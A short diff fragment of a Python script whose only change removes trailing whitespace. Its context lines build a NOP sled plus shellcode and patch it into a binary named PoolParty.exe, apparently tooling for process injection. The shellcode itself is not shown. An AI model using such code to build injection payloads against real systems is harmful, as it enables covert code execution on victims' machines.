@@ -18,7 +18,7 @@ def main():
     payload = b'\x90' * nops + shellcode
 
     new_pp = poolparty.replace(b"A" * 200000, payload)
-    
+
     open("PoolParty.exe", "wb").write(new_pp)
 
 if __name__ == "__main__":
